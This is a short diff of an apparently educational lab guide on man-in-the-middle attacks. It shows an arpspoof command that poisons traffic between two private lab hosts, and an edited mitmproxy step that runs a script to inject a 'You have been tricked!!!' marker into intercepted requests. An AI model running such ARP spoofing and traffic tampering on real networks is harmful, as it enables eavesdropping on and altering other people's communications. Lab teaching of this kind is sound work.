@@ -36,10 +36,10 @@ arpspoof -i eth0 -t 192.168.90.100 192.168.90.101
 
 ---
 
-## 5. Start mitmproxy
+## 5. Start mitmproxy in labscripts folder
 
 ```bash
-mitmproxy --mode transparent --showhost --listen-port 8080
+cd labscripts && mitmproxy -s tweak_body.py --mode transparent --listen-port 8080 --showhost
 ```
 
-You can now inspect all the requests and responses exchanged between the client and the server
+You can now inspect all the requests and responses exchanged between the client and the server. Additionally, the message "You have been tricked!!!" will be added to each request to confirm that the attack was successfully executed.
